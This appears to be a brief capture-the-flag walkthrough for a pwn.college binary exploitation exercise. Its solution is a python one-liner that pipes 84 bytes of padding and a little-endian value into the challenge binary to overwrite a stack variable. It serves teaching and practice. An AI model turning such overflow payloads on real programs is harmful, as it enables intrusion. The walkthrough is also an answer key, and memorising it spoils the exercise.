# Stage 05: Variable Control (Easy) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Easy |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-var-control-w` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-var-control-w`. The variable-control exercise: 84 bytes of `A` padding followed by the 4-byte value `\x23\xeb\x79\x5a` (little-endian `0x5a79eb23`) written to the binary's stdin.

## Solution

```bash
python3 -c "
import sys
payload = b'A' * 84 + b'\x23\xeb\x79\x5a'
sys.stdout.buffer.write(payload)
" | /challenge/binary-exploitation-var-control-w
```
